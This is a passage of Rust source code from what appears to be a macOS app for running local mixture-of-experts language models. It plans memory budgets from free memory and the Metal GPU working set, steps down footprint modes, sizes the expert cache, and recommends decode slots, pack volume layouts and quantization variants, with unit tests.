// The planner used the first and never looked at the second.

/// Share of the measured free pool the engine may claim: four fifths.
///
/// The reading is a snapshot taken seconds before llama-server starts
/// allocating, and the machine does not hold still in between: a tab opens,
/// Spotlight indexes, this app's own webview grows. One fifth of the pool is
/// what absorbs that drift, and it is also the honest price of counting
/// inactive pages as available, since macOS hands them over readily but
/// neither instantly nor always in full.
///
/// A FRACTION of the measured pool, not a constant, and that is the whole
/// point: a constant is exactly the mistake being replaced here. A fifth of
/// 4 GB free is a 0.8 GB cushion on a machine with nothing to spare, and a
/// fifth of 100 GB free is 20 GB on a machine that has plenty. The cushion has
/// to scale with the thing it is cushioning.
const AVAILABLE_CLAIM_NUM: u64 = 4;
const AVAILABLE_CLAIM_DEN: u64 = 5;

/// Total resident bytes the engine may occupy: non-expert weights, runtime
/// overhead and expert arena TOGETHER, not one of the three.
///
/// `available` is what `available_memory_bytes()` measured, and None when
/// vm_stat could not be read or parsed. A missing measurement falls back to
/// the hardware bound instead of refusing everything: no worse than the
/// behaviour this replaces, and a broken probe must never make the app
/// unusable.
///
/// `installed` reaches this from `ram_gb * 1e9`, which understates a machine
/// sold in GiB by about 7 percent, while `available` is real bytes from
/// vm_stat. The mismatch only ever makes the hardware bound smaller than the
/// truth, and a bound that errs toward leaving memory free is the one to keep.
/// The three readings that bound a start, and the one number every registry
/// `min_ram_gb` is written against.
///
/// Grouped rather than passed one by one because they answer the same
/// question, "what can this Mac give", and because they arrive together: one
/// is a property of the hardware, one is a measurement taken seconds before
/// the engine allocates, and one is what the GPU driver will actually let the
/// process hold.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
struct MachineLimits {
    /// `hw.memsize >> 30`. GiB, because that is the unit every `min_ram_gb`
    /// in the registry is written in.
    ram_gb: u64,
    /// vm_stat free plus inactive plus speculative. `None` when vm_stat could
    /// not be read.
    available: Option<u64>,
    /// `MTLDevice.recommendedMaxWorkingSetSize`. `None` when there is no Metal
    /// device (headless CI, a VM without GPU passthrough).
    gpu_working_set: Option<u64>,
}

impl MachineLimits {
    /// Read the machine. The only place these three come from a real Mac.
    fn probe(ram_gb: u64) -> Self {
        Self {
            ram_gb,
            available: available_memory_bytes(),
            gpu_working_set: hardware::gpu_limits().map(|g| g.working_set_bytes),
        }
    }

    /// A Mac for a test: installed GiB and what vm_stat would report, with no
    /// Metal reading. That is exactly the shape every planner test asserted
    /// before the GPU working set became a bound, so the numbers they pin stay
    /// the numbers they pinned.
    #[cfg(test)]
    fn mac(ram_gb: u64, available: Option<u64>) -> Self {
        Self { ram_gb, available, gpu_working_set: None }
    }
}

fn engine_budget_bytes(installed: u64, limits: MachineLimits) -> u64 {
    // Properties of the hardware, so they stay on installed RAM: never more
    // than 70 percent of the Mac, and never so much that the system reserve is
    // eaten. Both bound the TOTAL, which is the fix in defect 1.
    let mut bound =
        (installed * 7 / 10).min(installed.saturating_sub(system_reserve_bytes(installed)));
    // THE BOUND THE ALLOCATOR ACTUALLY ANSWERS TO, and the one nothing here
    // ever read.
    //
    // The expert arena is host memory (posix_memalign, h4-expert-store.cpp),
    // and llama.cpp hands it to Metal with newBufferWithBytesNoCopy under
    // MTLResourceStorageModeShared, then puts every buffer in an
    // MTLResidencySet and calls requestResidency (ggml-metal-device.m:1621 and
    // :1470, residency sets on by default from macOS 15, :827). The residency
    // is what wires the pages, measured: a 4 GiB shared buffer fully written
    // by the CPU moves vm_stat's wired count by 30 MiB, and requestResidency
    // on the same buffer moves it by the whole 4 GiB. What bounds that is
    // recommendedMaxWorkingSetSize, which llama.cpp treats as the total GPU
    // memory itself: it answers `free = recommended - currentAllocated`
    // (:1043).
    //
    // A BUDGET, NOT A GATE, so it is used as one. Apple calls it "an
    // approximation of how much memory this GPU device can allocate without
    // affecting its runtime performance" and asks callers to keep the total
    // footprint below it. Nothing refuses past it: llama.cpp only LOGS
    // (:1427), inside `#ifndef GGML_METAL_NDEBUG`, so a release build prints
    // nothing; the allocation then either succeeds and the machine pays in
    // swap, or newBufferWithBytesNoCopy returns nil and the backend buffer
    // fails (:1626). Apple documents no macOS OOM kill, fault or panic at all,
    // and the outcome reported in practice is the swap spiral rather than a
    // clean failure. Neither reaches the user as a sentence about memory. That
    // is what "it crashed twice" looked like from outside.
    //
    // NOT scaled by a fraction. 70 percent, the system reserve and the four
    // fifths of the live reading are already three separate cushions, and
    // recommendedMaxWorkingSetSize is itself macOS leaving headroom (107.5 of
    // 128 GiB on the machine this was written on, 84 percent). A fourth
    // invented fraction on top would be the same guessed constant this whole
    // change exists to remove.
    //
    // COMPUTED NOWHERE. The formula the internet quotes for this limit comes
    // from a 2023 decompilation of AGXAccelerator on a Ventura beta: reserve a
    // third below 32 GiB of unified memory, a quarter above. It already
    // disagrees with the hardware. On this machine it predicts 96.00 GiB and
    // the device answers 107.52. The API is read; no formula is kept.
    //
    // `None` falls through untouched: a machine with no Metal device is no
    // worse off than before, and a probe that failed must never make the app
    // refuse to start.
    if let Some(working_set) = limits.gpu_working_set {
        bound = bound.min(working_set);
    }
    match limits.available {
        None => bound,
        Some(free) => {
            bound.min(free.saturating_mul(AVAILABLE_CLAIM_NUM) / AVAILABLE_CLAIM_DEN)
        }
    }
}

#[cfg(test)]
mod engine_budget_tests {
    use super::{engine_budget_bytes, MachineLimits};

    const GB: u64 = 1_000_000_000;

    /// A machine with no Metal reading: what every test asserted before the
    /// GPU working set became a bound.
    fn ram_only(available: Option<u64>) -> MachineLimits {
        MachineLimits { ram_gb: 0, available, gpu_working_set: None }
    }

    #[test]
    fn without_a_reading_the_budget_is_the_hardware_bound() {
        // 70 percent of the Mac, and it bounds the TOTAL resident footprint.
        assert_eq!(engine_budget_bytes(24 * GB, ram_only(None)), 16_800_000_000);
        assert_eq!(engine_budget_bytes(128 * GB, ram_only(None)), 89_600_000_000);
    }

    #[test]
    fn a_busy_mac_gets_a_budget_from_what_is_free_not_from_what_it_was_sold_with() {
        // The colleague's 24 GB Mac with a browser open: 9 GB actually free.
        // The old planner offered 16.8 GB anyway; four fifths of 9 is 7.2.
        assert_eq!(engine_budget_bytes(24 * GB, ram_only(Some(9 * GB))), 7_200_000_000);
    }

    #[test]
    fn an_idle_mac_is_still_bounded_by_its_hardware() {
        // 22 GB free of 24 installed. Four fifths would be 17.6, more than the
        // 70 percent bound: the hardware bound must still win, or the engine
        // would fill a freshly booted Mac to the brim.
        assert_eq!(engine_budget_bytes(24 * GB, ram_only(Some(22 * GB))), 16_800_000_000);
    }

    #[test]
    fn a_machine_with_nothing_free_offers_nothing() {
        assert_eq!(engine_budget_bytes(24 * GB, ram_only(Some(0))), 0);
    }

    #[test]
    fn the_gpu_working_set_bounds_the_budget_when_it_is_the_tightest_of_the_three() {
        // The 24 GB Mac that crashed. Idle, so the live reading gives the
        // planner 16.8 GB, and Metal will let the process keep 15 GB resident.
        // Planning 16.8 GB of Metal buffers on a device that recommends 15 is
        // the over-commit nothing reports: either swap, or a nil buffer and a
        // backend failure the user reads as a crash.
        let m = MachineLimits {
            ram_gb: 24,
            available: Some(22 * GB),
            gpu_working_set: Some(15 * GB),
        };
        assert_eq!(engine_budget_bytes(24 * GB, m), 15 * GB);
    }

    #[test]
    fn a_generous_gpu_limit_never_widens_the_budget() {
        // The M5 Max this was written on: 128 GiB installed, Metal recommends
        // 107.5 GB. The 70 percent bound is 89.6 and must still win, or the
        // engine would fill the machine because the GPU said it could.
        let m = MachineLimits {
            ram_gb: 128,
            available: None,
            gpu_working_set: Some(115_448_725_504),
        };
        assert_eq!(engine_budget_bytes(128 * GB, m), 89_600_000_000);
    }

    #[test]
    fn a_mac_with_no_metal_device_is_no_worse_off_than_before() {
        // Headless CI, or a VM. A failed probe must never refuse a start.
        let with = MachineLimits { ram_gb: 24, available: Some(9 * GB), gpu_working_set: None };
        assert_eq!(engine_budget_bytes(24 * GB, with), 7_200_000_000);
    }
}

/// The footprint modes, from the hungriest to the leanest. The step-down walks
/// this array, so its order IS the policy.
const MODE_LADDER: [&str; 3] = ["perf", "balanced", "eco"];

/// What the engine would hold resident in each mode, for one model on one
/// machine. Bytes, weights and runtime overhead included, not just the arena.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
struct ModeFootprints {
    eco: u64,
    balanced: u64,
    perf: u64,
}

impl ModeFootprints {
    fn resident(&self, mode: &str) -> u64 {
        match mode {
            "eco" => self.eco,
            "perf" => self.perf,
            _ => self.balanced,
        }
    }
}

/// The mode a start will actually use, and the numbers that justify it.
#[derive(Serialize, Clone, Debug, PartialEq, Eq)]
struct ModeDecision {
    /// The mode the engine is started in.
    mode: String,
    /// The mode the user asked for. Different from `mode` after a step-down.
    requested: String,
    /// True when not even eco fits. The start is then refused with a sentence
    /// about memory, rather than spawning an engine that will die mid-graph.
    impossible: bool,
    /// What the engine will hold, all three terms together.
    resident_bytes: u64,
    /// What the machine can give right now.
    budget_bytes: u64,
}

/// Choose the footprint mode to START in.
///
/// Pure: (budget in bytes, model geometry, requested mode) in, decision out.
/// No clock, no filesystem, no machine, so every shape that matters can be
/// tested instead of only the shape the developer's Mac happens to have.
///
/// A DECISION, not a retry. The engine cannot be asked politely whether a
/// graph will fit: llama_decode either runs it or returns below -1 and the
/// user reads "Compute error." with nothing pointing at memory. So the
/// comparison happens before anything is spawned.
///
/// The ladder is walked DOWNWARDS from what the user asked for, never upwards.
/// A user who chose eco gets eco on every machine: the automatic part of this
/// is a safety net, not an opinion about what the user wanted.
fn choose_start_mode(budget: u64, footprints: ModeFootprints, requested: &str) -> ModeDecision {
    // An unrecognised mode is treated as balanced, which is what the settings
    // reader already defaults to.
    let start = MODE_LADDER.iter().position(|m| *m == requested).unwrap_or(1);
    let requested = MODE_LADDER[start];
    for mode in &MODE_LADDER[start..] {
        let resident = footprints.resident(mode);
        if resident <= budget {
            return ModeDecision {
                mode: (*mode).to_string(),
                requested: requested.to_string(),
                impossible: false,
                resident_bytes: resident,
                budget_bytes: budget,
            };
        }
    }
    ModeDecision {
        mode: "eco".to_string(),
        requested: requested.to_string(),
        impossible: true,
        resident_bytes: footprints.eco,
        budget_bytes: budget,
    }
}

#[cfg(test)]
mod choose_start_mode_tests {
    use super::{choose_start_mode, ModeFootprints};

    const GB: u64 = 1_000_000_000;

    /// Roughly GLM-4.5-Air on a 24 GB Mac: 6 GB of non-expert weights plus
    /// overhead, then an arena that grows with the mode.
    fn footprints() -> ModeFootprints {
        ModeFootprints { eco: 8 * GB, balanced: 13 * GB, perf: 17 * GB }
    }

    #[test]
    fn an_idle_mac_starts_in_the_mode_the_user_asked_for() {
        let d = choose_start_mode(17 * GB, footprints(), "perf");
        assert_eq!(d.mode, "perf");
        assert_eq!(d.requested, "perf");
        assert!(!d.impossible);
        assert_eq!(d.resident_bytes, 17 * GB);
    }

    #[test]
    fn a_busy_mac_steps_down_to_the_mode_that_fits_and_says_which() {
        // 12 GB to give: perf does not fit, balanced does not fit, eco does.
        let d = choose_start_mode(12 * GB, footprints(), "perf");
        assert_eq!(d.mode, "eco");
        assert_eq!(d.requested, "perf");
        assert!(!d.impossible);
        assert_eq!(d.resident_bytes, 8 * GB);
        assert_eq!(d.budget_bytes, 12 * GB);
    }

    #[test]
    fn the_step_is_one_rung_when_one_rung_is_enough() {
        // The whole point of a ladder rather than a straight fall to eco: a
        // machine that can afford balanced is not punished with eco.
        let d = choose_start_mode(13 * GB, footprints(), "perf");
        assert_eq!(d.mode, "balanced");
    }

    #[test]
    fn the_ladder_never_climbs() {
        // A user who chose eco keeps eco on a machine that could hold perf.
        let d = choose_start_mode(64 * GB, footprints(), "eco");
        assert_eq!(d.mode, "eco");
        assert_eq!(d.resident_bytes, 8 * GB);
    }

    #[test]
    fn nothing_fitting_is_reported_as_impossible_rather_than_started_anyway() {
        // This is the case that used to become "Compute error." after the
        // user had already typed a message and waited.
        let d = choose_start_mode(5 * GB, footprints(), "balanced");
        assert!(d.impossible);
        assert_eq!(d.mode, "eco");
        assert_eq!(d.resident_bytes, 8 * GB);
        assert_eq!(d.budget_bytes, 5 * GB);
    }

    #[test]
    fn an_unknown_mode_is_read_as_balanced() {
        let d = choose_start_mode(64 * GB, footprints(), "turbo");
        assert_eq!(d.mode, "balanced");
        assert_eq!(d.requested, "balanced");
    }
}

/// Everything a start needs from the planner: the numbers the engine is given,
/// and the mode decision that produced them.
#[derive(Clone, Debug)]
struct CachePlan {
    cache_bytes: u64,
    /// SLRU protected fraction.
    protected: f64,
    /// Physical micro-batch.
    ubatch: u32,
    decision: ModeDecision,
}

fn plan_cache(
    entry: &Value,
    machine: MachineLimits,
    override_gb: Option<u64>,
    ram_mode: &str,
    cpu_moe_regime: bool,
    // Decode slots the engine will be started with. Each one past the first is
    // a whole extra KV cache, and the planner used to ignore them.
    slots: u32,
) -> Result<CachePlan, String> {
    let ram_gb = machine.ram_gb;
    // Hard gate, mirrored by the UI card: below the registry minimum the
    // engine cannot hold the non-expert weights plus a viable cache, so the
    // model is refused everywhere (app start, CLI serve), not just greyed out.
    if let Some(min) = entry["min_ram_gb"].as_u64() {
        if ram_gb < min {
            return Err(format!(
                "this model needs at least {min} GB of RAM, this Mac has {ram_gb} GB"
            ));
        }
    }
    // Physical geometry. The install pipeline measures it from the actual GGUF
    // (moe-profile.py writes models/<id>/profile.json), so that file is the
    // truth and the registry only a pre-install estimate. Missing everywhere is
    // a hard error: the old defaults (record 1 byte, experts 256) made the
    // probation guard below fictional and the engine aborted at the first
    // micro-batch with "free list a sec".
    let geo = measured_geometry(entry);
    let (non_expert, expert_total, layers, record, used, experts) = match geo {
        Some(g) => g,
        None => {
            return Err(
                "this model has no measured geometry yet (record size, expert bytes): \
                 install it so the engine profile is generated before starting it"
                    .into(),
            )
        }
    };

    let ram = ram_gb * 1_000_000_000;
    // Ceiling: what the machine can afford at most.
    //
    // The engine's resident memory is the arena plus the non-expert weights
    // plus a third term nothing accounted for: KV cache, compute buffers and
    // the graph. A flat 4.5 GB used to stand for it and was wrong in the one
    // direction that hurts, too small. Measured resident footprint minus arena
    // minus weights, at ctx 8192: 3.2 GB for Qwen3-Next-80B, 3.4 for
    // Qwen3-30B, 3.7 for gpt-oss-120b, 4.0 for GLM-4.5-Air, 4.5 for Llama-4
    // Scout, 7.6 for GLM-5.2 744B. It tracks the non-expert weights, which is
    // expected since both grow with layer count and hidden size. The affine
    // fit below rounds UP on every measured point except the two extremes it
    // interpolates exactly, so the ceiling errs toward leaving memory free.
    //
    // On top of that, the machine still has to run macOS and whatever the user
    // is doing. Without that reserve the planner filled the machine to the
    // brim: GLM-4.5-Air on a 24 GB Mac reached 23.5 GB resident and generated
    // at 1.5 tok/s, Llama-4 Scout on the same Mac exceeded it outright.
    //
    // The fit was measured at ctx 8192, which is ONE decode slot, and the
    // engine is started with --ctx-size CTX_PER_SLOT * slots. The extra slots
    // are KV cache and nothing else: 0.8 GB each, measured on Qwen3-30B-A3B
    // (29.6 GB resident at 1 slot, 30.4 at 2, 32.0 at 4). The default is two
    // slots, so the ceiling was quietly 0.8 GB optimistic on every machine,
    // and 2.4 GB on a user who asked for four.
    let runtime_overhead = 2_500_000_000
        + non_expert * 45 / 100
        + u64::from(slots.saturating_sub(1)) * KV_BYTES_PER_EXTRA_SLOT;
    // Everything the engine pays before a single expert byte is cached.
    let fixed = non_expert + runtime_overhead;

    // TWO ceilings, and they answer two different questions.
    //
    // The HARDWARE ceiling is what this Mac could give if nothing else were
    // running, and it is what the three modes are DEFINED against: eco has to
    // mean the same footprint whether or not a browser is open, otherwise the
    // mode names would describe the weather rather than a policy.
    //
    // The 70 percent cap inside it used to bound the ARENA, with the weights
    // and the runtime overhead added on top, so a bound that reads "never take
    // more than 70 percent of this Mac" delivered 90. On a 24 GB Mac five of
    // the seven eligible models planned about 22 GB resident, leaving two for
    // macOS, for this app and its webview, and for everything the user had
    // open. It now bounds what it claims to bound, the TOTAL, and the arena is
    // what is left of the budget once the weights and the overhead are paid.
    // The GPU working set stays in BOTH budgets, unlike the live reading: it
    // is a property of the device, not of the moment, so a mode has to mean
    // the same footprint whether or not a browser is open AND has to be a
    // footprint Metal will actually hold.
    let hardware_budget =
        engine_budget_bytes(ram, MachineLimits { available: None, ..machine });
    let ceiling_cache = hardware_budget.saturating_sub(fixed).min(expert_total);

    // The LIVE budget is what the machine can give right now, and it is the one
    // the decision is taken against. Before this, nothing in the planner ever
    // looked at a number that could change after the Mac left the factory.
    let live_budget = engine_budget_bytes(ram, machine);

    // Memory-footprint policy over the registry's MEASURED curve. The point
    // of Galactus on a machine where the model would fit natively is to run
    // it in a FRACTION of the RAM, not to hoard it:
    // - eco:      smallest measured cache (minimum viable footprint)
    // - balanced: full residency when this machine can afford it, otherwise
    //             the knee, i.e. the smallest measured cache reaching >= 90%
    //             of the best generation throughput reachable here
    // - perf:     the full planning ceiling
    let measured: Vec<(f64, f64)> = entry["measured"]
        .as_array()
        .map(|a| {
            let mut v: Vec<(f64, f64)> = a
                .iter()
                .filter_map(|p| {
                    Some((p["cache_gb"].as_f64()?, p["gen_tps"].as_f64()?))
                })
                .collect();
            v.sort_by(|x, y| x.0.total_cmp(&y.0));
            v
        })
        .unwrap_or_default();
    // `ceiling` is the largest cache the mode may reach. It is the HARDWARE
    // ceiling, not the live one: the three modes have to keep meaning the same
    // thing from one minute to the next, and it is the step-down, not a silent
    // shrinking of every mode, that answers a machine under pressure.
    let policy_cache = |mode: &str, ceiling: u64| -> u64 {
        if measured.is_empty() {
            // No benchmark curve for this entry: eco/balanced would silently
            // become "take the whole ceiling", the exact opposite of the
            // footprint promise. Fall back to the registry's minimum viable
            // cache, and only perf climbs to the ceiling.
            let floor = entry["min_cache_bytes"].as_u64().unwrap_or(0);
            return if mode == "perf" || floor == 0 { ceiling } else { floor.min(ceiling) };
        }
        match mode {
            "eco" => (measured[0].0 * 1e9) as u64,
            "perf" => ceiling,
            _ => {
                // Full residency first, when the ceiling already reaches every
                // routed expert byte. The knee optimizes GENERATION throughput
                // per byte of RAM, and it was the right criterion until
                // residency became a step change in PROMPT throughput: a
                // resident cache never evicts, so the physical micro-batch
                // jumps from a handful of tokens to llama.cpp's standard 512.
                // RAM left unused buys nothing, whereas minutes of waiting
                // before the first token are paid on every single message.
                // eco stays the explicit minimum-footprint mode, and a machine
                // that cannot hold the experts still falls through to the knee
                // below, streamed regime untouched.
                if ceiling >= expert_total {
                    return ceiling;
                }
                // Best throughput reachable within the ceiling, then the
                // smallest cache reaching 90% of it.
                let reachable = measured
                    .iter()
                    .filter(|(c, _)| (*c * 1e9) as u64 <= ceiling)
                    .map(|(_, t)| *t)
                    .fold(measured[0].1, f64::max);
                for (c, t) in &measured {
                    if *t >= 0.9 * reachable {
                        return (*c * 1e9) as u64;
                    }
                }
                ceiling
            }
        }
    };

    // THE DECISION, taken before anything is spawned. What each mode would
    // hold, against what the machine can actually give right now.
    let footprints = ModeFootprints {
        eco: fixed + policy_cache("eco", ceiling_cache),
        balanced: fixed + policy_cache("balanced", ceiling_cache),
        perf: fixed + policy_cache("perf", ceiling_cache),
    };
    let mut decision = choose_start_mode(live_budget, footprints, ram_mode);
    if decision.impossible {
        if override_gb.is_none() {
            // The missing figure, named. "Not enough memory" without a number
            // leaves a user guessing how much to close, which is the same
            // helplessness as "Compute error." wearing better clothes.
            return Err(format!(
                "not enough free memory to start this model right now: its smallest footprint \
                 (eco) needs {:.1} GB, this Mac can spare {:.1} GB, short by {:.1} GB. Quit an \
                 application, or close some browser tabs, then start it again.",
                footprints.eco as f64 / 1e9,
                live_budget as f64 / 1e9,
                footprints.eco.saturating_sub(live_budget) as f64 / 1e9,
            ));
        }
        // An explicit cache size is the user overruling the policy. The clamp
        // below and the quota gate are then the only guards left, which is
        // what an override is for.
        decision.impossible = false;
    }

    // The arena this start actually gets: the chosen mode's cache, never more
    // than the live budget leaves free.
    let max_cache = live_budget.saturating_sub(fixed).min(expert_total);
    let mut cache = match override_gb {
        Some(gb) => gb * 1_000_000_000,
        None => policy_cache(&decision.mode, ceiling_cache),
    };
    cache = cache.min(max_cache).min(expert_total);
    // `decision.resident_bytes` deliberately keeps the CHOSEN MODE's own
    // footprint, not `fixed + cache`. The two are equal whenever the decision
    // was sound, since a mode that fits the budget has a cache that fits
    // `max_cache`; overwriting it would make the clamp above silently repair a
    // wrong decision and hide it from every assertion. The clamp stays as a
    // belt, never as the thing that makes the number true.
    //
    // An explicit override is the one case where the decision did not pick the
    // size, so there the reported figure is what the engine will really hold.
    if override_gb.is_some() {
        decision.resident_bytes = fixed + cache;
    }

    let quota = (cache / (layers * record)).min(experts);
    if quota < 2 {
        return Err(format!(
            "not enough memory for this model right now: the arena would be {:.1} GB, too small \
             to hold two experts per layer. This Mac can spare {:.1} GB in total and the weights \
             alone need {:.1} GB.",
            cache as f64 / 1e9,
            live_budget as f64 / 1e9,
            fixed as f64 / 1e9,
        ));
    }
    for f in [0.75f64, 0.50, 0.25] {
        let mut protected = (quota as f64 * f) as u64;
        protected = protected.clamp(1, quota - 1);
        let probation = quota - protected;
        if probation >= used {
            // STREAMED regime: the largest physical micro-batch whose distinct
            // experts fit in the probation segment, probation / experts_used,
            // capped at 8. A cold batch inserts only into probation, so beyond
            // that bound it would evict its own members.
            //
            // FULL RESIDENCY: every expert owns a permanent slot, the cache
            // stops evicting (h4-expert-cache.cpp) and nothing constrains the
            // micro-batch, so take llama.cpp's standard 512. Prompt processing
            // measured 5 to 13 times faster.
            //
            // The numerics are verified AT that shape, not assumed: the parity
            // probe now sweeps 11 quant types x 13 token counts from 1 to 512 x
            // both projection shapes the MoE block emits, 286 cases, every bit
            // identical to the CPU path. An earlier perplexity table seemed to
            // show the kernels failing past micro-batch 32; the flaw was in the
            // instrument, since llama.cpp pulls mul_mat_id back onto the GPU at
            // batch 32 (op_offload_min_batch_size), so --n-cpu-moe stopped
            // being a CPU reference exactly there.
            //
            // The cross-check regime keeps the small micro-batch: it exists to
            // recompute experts on CPU, not to be fast, and llama.cpp asserts
            // out of bounds on that path at 512.
            let ubatch = if cache >= expert_total && !cpu_moe_regime {
                512u32
            } else {
                (probation / used).clamp(1, 8) as u32
            };
            return Ok(CachePlan { cache_bytes: cache, protected: f, ubatch, decision });
        }
    }
    Err(format!(
        "not enough memory for this model right now: the arena would be {:.1} GB, too small to \
         keep one token's active experts on probation. This Mac can spare {:.1} GB in total.",
        cache as f64 / 1e9,
        live_budget as f64 / 1e9,
    ))
}

// ------------------------------------------------- what to choose, per model
//
// The owner's instruction, verbatim: case by case, model after model, rather
// than one global rule. Every function below takes ONE registry entry and ONE
// machine, and none of them holds an opinion that applies to all ten models.
//
// Where the policy LIVES: in the registry entry, next to the geometry and the
// measured curve that the same entry already carries. The optional keys these
// functions read are documented on each function. When a key is absent the
// answer is derived from the geometry that IS there, and the derivation is
// today's behaviour, so a registry with no policy keys behaves exactly as it
// behaves now and every key added later only ever narrows a choice.

/// The most decode slots the app will ever recommend on its own.
///
/// A slot past the first is a whole extra KV cache: `KV_BYTES_PER_EXTRA_SLOT`,
/// 0.8 GB, measured. Above two, nothing the app can read tells it the user
/// wants a third conversation generating at the same time, so that stays an
/// explicit choice in Settings rather than a guess the machine pays for.
const RECOMMENDED_SLOT_CAP: u32 = 2;

/// How many conversations may generate at once, for THIS model on THIS Mac.
///
/// The app shipped a flat default of two. Two slots cost 0.8 GB taken out of
/// the arena of every model on every Mac, whether or not the machine had it,
/// and on a 24 GB Mac 0.8 GB is exactly the difference between a mode that
/// fits and a mode that does not.
///
/// THE RULE: a second conversation must never cost the user a footprint mode.
/// The count is the largest n up to the cap for which the mode the user asked
/// for still starts, and 1 when even that does not hold.
fn recommended_slots(entry: &Value, machine: MachineLimits, ram_mode: &str, cpu_moe: bool) -> u32 {
    for n in (2..=RECOMMENDED_SLOT_CAP).rev() {
        match plan_cache(entry, machine, None, ram_mode, cpu_moe, n) {
            Ok(plan) if plan.decision.mode == plan.decision.requested => return n,
            _ => continue,
        }
    }
    1
}

/// A volume the installer could write a pack to.
#[derive(Clone, Debug, PartialEq)]
struct PackVolume {
    mount: String,
    free_bytes: u64,
    /// Measured sequential read bandwidth, GB/s, from `volume_bandwidth`.
    /// `None` when this volume has not been probed, and an unprobed volume is
    /// never chosen as the second half of a dual pack: the split ratio is
    /// computed FROM the two bandwidths, so guessing one would write a pack
    /// cut at the wrong place for the life of the install.
    bandwidth_gbs: Option<f64>,
}

/// Where a model's pack should be written.
#[derive(Serialize, Clone, Debug, PartialEq, Eq)]
#[serde(tag = "kind", rename_all = "kebab-case")]
enum PackLayout {
    /// One volume carries the whole pack.
    Single { mount: String },
    /// Both volumes carry a share of every record and are read in parallel.
    /// `internal` is the faster of the two and takes the larger share.
    Dual { internal: String, external: String },
    /// No arrangement of the mounted volumes has room for this model.
    NoRoom,
}

/// Bytes left free on a volume beyond the share it carries. Same 2 GiB the
/// download preflight keeps (`INSTALL_DOWNLOAD_RESERVE_GIB`): a volume filled
/// to its last byte is a volume macOS cannot work on.
const PACK_VOLUME_RESERVE: u64 = INSTALL_DOWNLOAD_RESERVE_GIB * 1024 * 1024 * 1024;

/// The slowest a second volume may be before splitting the pack across it
/// costs more than it buys.
///
/// Not a new number: it is the threshold the install pipeline already applies
/// as a fallback, and the one the install dialog already paints as its
/// bottleneck verdict. What was missing is that the user had to reach that
/// verdict by hand, by choosing dual and pressing Measure.
const DUAL_BANDWIDTH_FLOOR: f64 = 0.35;

/// Which volume layout to preselect, from volumes that have been measured.
///
/// Dual is the point of the pack format: both volumes are read in parallel, so
/// a record is ready when the slower side finishes, and `pack_split_ratio`
/// cuts each record at r* = Bi / (Bi + Be) so the two finish together. It is
/// therefore preferred whenever a second volume is fast enough to be worth
/// reading from and both sides have room for their shares.
///
/// Single wins when there is one volume, when the second is under
/// `DUAL_BANDWIDTH_FLOOR` of the first, when the second has not been measured,
/// or when the shares do not fit but the whole pack does.
fn recommend_layout(volumes: &[PackVolume], pack_bytes: u64) -> PackLayout {
    // Fastest first. An unmeasured volume sorts last rather than being
    // treated as slow: it may well be the fastest, nobody asked it yet.
    let mut ranked: Vec<&PackVolume> = volumes.iter().collect();
    ranked.sort_by(|a, b| {
        b.bandwidth_gbs
            .unwrap_or(-1.0)
            .total_cmp(&a.bandwidth_gbs.unwrap_or(-1.0))
            .then(b.free_bytes.cmp(&a.free_bytes))
    });

    let fits_whole = |v: &PackVolume| v.free_bytes >= pack_bytes + PACK_VOLUME_RESERVE;

    // Dual first: the best pair by aggregate bandwidth whose shares both fit.
    let mut best: Option<(f64, &PackVolume, &PackVolume)> = None;
    for (i, fast) in ranked.iter().enumerate() {
        for slow in ranked.iter().skip(i + 1) {
            let (Some(bi), Some(be)) = (fast.bandwidth_gbs, slow.bandwidth_gbs) else { continue };
            if bi <= 0.0 || be < DUAL_BANDWIDTH_FLOOR * bi {
                continue;
            }
            // The real cut, the one the packer and the engine will both use.
            let ratio = pack_split_ratio(bi, be);
            let share_fast = (pack_bytes as f64 * ratio) as u64;
            let share_slow = pack_bytes.saturating_sub(share_fast);
            if fast.free_bytes < share_fast + PACK_VOLUME_RESERVE
                || slow.free_bytes < share_slow + PACK_VOLUME_RESERVE
            {
                continue;
            }
            let aggregate = bi + be;
            if best.map(|(a, _, _)| aggregate > a).unwrap_or(true) {
                best = Some((aggregate, fast, slow));
            }
        }
    }
    if let Some((_, fast, slow)) = best {
        return PackLayout::Dual { internal: fast.mount.clone(), external: slow.mount.clone() };
    }

    match ranked.iter().find(|v| fits_whole(v)) {
        Some(v) => PackLayout::Single { mount: v.mount.clone() },
        None => PackLayout::NoRoom,
    }
}

/// Which quantization to offer for download, for THIS model on THIS Mac.
///
/// # The registry key
///
/// ```json
/// "variants": [
///   { "id": "Q8_0",   "min_ram_gb": 64, "gguf_bytes": 79000000000, "download": { ... } },
///   { "id": "Q4_K_M", "min_ram_gb": 32, "gguf_bytes": 45000000000, "download": { ... } },
///   { "id": "IQ2_XXS","min_ram_gb": 16, "gguf_bytes": 23000000000, "download": { ... } }
/// ]
/// ```
///
/// Absent, which is every entry today, this returns `None` and the caller uses
/// the entry's single `download` block: today's behaviour, unchanged, so the
/// key can be added one model at a time while the campaign is running.
///
/// # The rule
///
/// The largest variant this Mac can hold: highest `gguf_bytes` among those
/// whose `min_ram_gb` the machine meets. Judged on INSTALLED RAM and never on
/// the live reading. A download is not a start: a browser tab open at download
/// time must not condemn the user to a smaller model for the life of the
/// install, and the mode ladder is what answers a machine under pressure.
fn recommend_variant(entry: &Value, ram_gb: u64) -> Option<String> {
    let variants = entry["variants"].as_array()?;
    variants
        .iter()
        .filter(|v| v["min_ram_gb"].as_u64().map(|min| ram_gb >= min).unwrap_or(false))
        .max_by_key(|v| v["gguf_bytes"].as_u64().unwrap_or(0))
        .and_then(|v| v["id"].as_str())
        .map(str::to_string)
}

#[cfg(test)]
mod recommendation_tests {
    use super::*;

    const GB: u64 = 1_000_000_000;

    fn vol(mount: &str, free_gb: u64, bw: Option<f64>) -> PackVolume {
        PackVolume { mount: mount.into(), free_bytes: free_gb * GB, bandwidth_gbs: bw }
    }

    #[test]
    fn one_volume_carries_the_whole_pack() {
        let v = vec![vol("/", 200, Some(6.0))];
        assert_eq!(
            recommend_layout(&v, 60 * GB),
            PackLayout::Single { mount: "/".into() }
        );
    }

    #[test]
    fn a_second_volume_fast_enough_to_read_from_is_used() {
        // Two decent SSDs: reading both in parallel is what the pack format
        // is for, and the user had to discover it by choosing dual by hand.
        let v = vec![vol("/", 200, Some(6.0)), vol("/Volumes/T7", 200, Some(3.0))];
        assert_eq!(
            recommend_layout(&v, 60 * GB),
            PackLayout::Dual { internal: "/".into(), external: "/Volumes/T7".into() }
        );
    }

    #[test]
    fn a_second_volume_too_slow_to_be_worth_reading_is_left_alone() {
